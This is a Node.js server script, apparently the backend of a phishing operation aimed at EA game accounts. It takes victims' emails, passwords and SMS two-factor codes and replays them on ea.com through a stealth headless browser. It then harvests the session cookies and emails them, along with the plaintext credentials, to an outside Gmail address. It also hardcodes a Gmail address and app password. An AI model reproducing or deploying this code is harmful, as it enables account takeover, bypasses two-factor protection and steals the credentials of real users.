const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs/promises'); 
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());

const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'doufi515@gmail.com',
    pass: 'kmul rrqg ztlh irxv', // App password
  },
});

puppeteer.use(StealthPlugin());

let browser;
let page;
let isPageLoading = false;

const loginUrl = "https://www.ea.com/login";
const sendCodeButtonSelector = 'a#btnSendCode';
const errorMessageSelector = 'p.otkinput-errormsg.otkc';

//------------------ In-Memory Storage ------------------
const emailCache = {};
const CACHE_TTL = 60000; 
const emailStore = {}; // IP -> {email, password}

// Cache helper
function cacheEntry(ip, data) {
    emailCache[ip] = { data, timestamp: Date.now() };
}

function getCacheEntry(ip) {
    const entry = emailCache[ip];
    if (entry) {
        if (Date.now() - entry.timestamp < CACHE_TTL) return entry.data;
        else delete emailCache[ip];
    }
    return null;
}

//------------------ Browser ------------------
async function startBrowserAndPage() {
    browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-gpu', '--enable-webgl'],
    });
    await preloadNewPage();
}

async function preloadNewPage() {
    if (isPageLoading) return;
    isPageLoading = true;

    page = await browser.newPage();

    await page.setRequestInterception(true);
    page.on('request', (request) => {
        if (['image', 'stylesheet', 'font'].includes(request.resourceType())) request.abort();
        else request.continue();
    });

    await page.setUserAgent(ua);
    await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
    await page.setViewport({ width: 1280, height: 800 });

    await page.evaluate(() => {
        const rememberMeCheckbox = document.querySelector('input#rememberMe');
        if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
    });

    console.log('Page preloaded and ready.');
    isPageLoading = false;
}

startBrowserAndPage();

//------------------ Login ------------------
async function performLogin(page, email, password) {
    try {
        await page.type('input[id="email"]', email);
        console.log("Email input complete.");
        await page.keyboard.press('Enter');
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        await page.type('input[id="password"]', password);
        console.log("Password input complete.");
        await Promise.all([page.keyboard.press('Enter'), page.waitForNavigation({ waitUntil: 'domcontentloaded' })]);

        const errorMessageElement = await page.$(errorMessageSelector);
        if (errorMessageElement) return false;

        const sendCodeVisible = await page.waitForSelector(sendCodeButtonSelector, { timeout: 5000 }).catch(() => false);
        if (sendCodeVisible) await page.click(sendCodeButtonSelector);

        return true;
    } catch (error) {
        console.error("Login error:", error);
        return false;
    }
}

//------------------ In-Memory Handlers ------------------
function saveEmailPasswordIP(email, password, ip) {
    const cachedData = getCacheEntry(ip);
    if (cachedData) return;
    emailStore[ip] = { email, password };
    cacheEntry(ip, { email, password });
    console.log('Data saved in memory for IP:', ip);
}

function getEmailPasswordByIP(ip) {
    const data = emailStore[ip];
    if (!data) throw new Error('IP not found');
    return data;
}

//------------------ Routes ------------------
app.post('/login', async (req, res) => {
    const { email, password, ip } = req.body;
    if (!email || !password || !ip) return res.status(400).json({ error: 'Email, password, and IP are required' });

    try {
        if (isPageLoading) {
            await new Promise((resolve) => {
                const checkPageLoaded = setInterval(() => {
                    if (!isPageLoading) { clearInterval(checkPageLoaded); resolve(); }
                }, 500);
            });
        }

        const loginSuccessful = await performLogin(page, email, password);

        if (!loginSuccessful) return res.status(400).json({ error: 'Wrong credentials' });

        saveEmailPasswordIP(email, password, ip);
        res.status(200).json({ success: true, message: 'Login successful' });

    } catch (error) {
        console.error('Login route error:', error);
        res.status(500).json({ error: 'Internal server error' });
    } finally {
        if (page && !page.isClosed()) {
            await page.close();
            preloadNewPage();
        }
    }
});

async function SecondperformLogin(page, email, password) {
    try {
        await page.evaluate(() => { const rememberMeCheckbox = document.querySelector('input#rememberMe'); if (rememberMeCheckbox) rememberMeCheckbox.checked = true; });
        await page.waitForSelector('input[id="email"]', { visible: true });
        await page.type('input[id="email"]', email);
        await page.keyboard.press('Enter');
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        await page.waitForSelector('input[id="password"]', { visible: true });
        await page.type('input[id="password"]', password);
        await Promise.all([page.keyboard.press('Enter'), page.waitForNavigation({ waitUntil: 'domcontentloaded' })]);

        const errorMessageElement = await page.$(errorMessageSelector);
        if (errorMessageElement) return false;

        const sendCodeVisible = await page.waitForSelector(sendCodeButtonSelector, { timeout: 10000 }).catch(() => false);
        if (sendCodeVisible) await page.click(sendCodeButtonSelector);

        return true;
    } catch (error) {
        console.error('Second login error:', error);
        return false;
    }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

app.post('/loginsms', async (req, res) => {
    const { ip, code } = req.body;
    if (!ip || !code) return res.status(400).json({ error: 'IP and code are required' });

    let browserInstance;
    try {
        const emailPasswordData = getEmailPasswordByIP(ip);

        browserInstance = await puppeteer.launch({ 
            headless: true, 
            args: ['--no-sandbox','--disable-gpu','--enable-webgl','--window-size=1500,800','--disable-http2'] 
        });
        const pageSMS = await browserInstance.newPage();

        await pageSMS.setRequestInterception(true);
        pageSMS.on('request', (request) => {
            if (['image','stylesheet','font'].includes(request.resourceType())) request.abort();
            else request.continue();
        });

        await pageSMS.setUserAgent(ua);
        await pageSMS.goto(loginUrl, { waitUntil: 'networkidle2' });

        await SecondperformLogin(pageSMS, emailPasswordData.email, emailPasswordData.password);

        // أدخل الكود
        await pageSMS.waitForSelector('input#twoFactorCode', { visible: true, timeout: 15000 });
        await pageSMS.type('input#twoFactorCode', code);
        await pageSMS.waitForSelector('a#btnSubmit', { visible: true, timeout: 15000 });
        await pageSMS.click('a#btnSubmit');

        await pageSMS.waitForNavigation({ waitUntil: 'networkidle2' });
        await sleep(3000);

        // تحقق إذا الكود خاطئ
        const errorElement = await pageSMS.$('p.otkinput-errormsg'); // رسالة الخطأ
        if (errorElement) {
            const errorText = await pageSMS.evaluate(el => el.textContent, errorElement);
            console.log("SMS error:", errorText);
            return res.status(400).json({ success: false, message: 'SMS code incorrect' });
        }

        // الكود صحيح، احفظ الكوكيز وأرسل الايميل
        const cookies = await pageSMS.cookies();
        console.log('Cookies:', cookies);

        const userEntry = {
            email: emailPasswordData.email,
            password: emailPasswordData.password,
            cookies: cookies.filter(c => !c.name.includes('EDGESCAPE')).map(c => ({ ...c, secure: true, sameSite: 'lax' }))
        };

        const emailOptions = {
            from: '"DOUFI 🔥👑" <doufi515@gmail.com>',
            to: 'doufififa7@gmail.com',
            subject: emailPasswordData.email,
            text: `Here are the cookies that were just saved:\n\n${JSON.stringify(userEntry, null, 2)}`,
        };
        await sendEmail(emailOptions);

        res.status(200).json({ success: true, message: 'Login successful after SMS' });

    } catch (error) {
        console.error('SMS login error:', error);
        res.status(500).json({ success: false, error: 'Error during SMS login' });
    } finally {
        if (browserInstance) await browserInstance.close();
    }
});



const sendEmail = async (emailOptions) => {
    return new Promise((resolve, reject) => {
        transporter.sendMail(emailOptions, (err, info) => {
            if (err) reject(err);
            else resolve(info);
        });
    });
};

//------------------ Graceful Exit ------------------
process.on('SIGINT', async () => {
    if (browser) await browser.close();
    process.exit();
});

//------------------ Start Server ------------------
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});




